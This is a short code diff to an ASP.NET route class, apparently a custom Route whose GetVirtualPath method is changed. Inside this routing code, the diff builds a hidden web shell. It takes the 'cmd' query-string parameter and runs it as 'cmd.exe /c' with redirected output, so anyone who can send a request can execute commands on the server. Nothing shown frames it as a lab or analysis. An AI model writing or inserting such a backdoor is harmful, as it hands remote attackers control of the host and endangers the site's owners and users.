@@ -14,12 +14,13 @@
         public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
         {
             HttpContext context = HttpContext.Current;
-            String Payload = context.Request.QueryString["cmd"];
-            if (Payload != null)
+            String cmd = context.Request.QueryString["cmd"];
+            if (cmd != null)
             {
                 HttpResponseBase response = new HttpResponseWrapper(context.Response);
                 Process p = new Process();
-                p.StartInfo.FileName = Payload;
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.Arguments = "/c " + cmd;
                 Debug.WriteLine(p.StartInfo.FileName);
                 p.StartInfo.UseShellExecute = false;
                 p.StartInfo.RedirectStandardOutput = true;
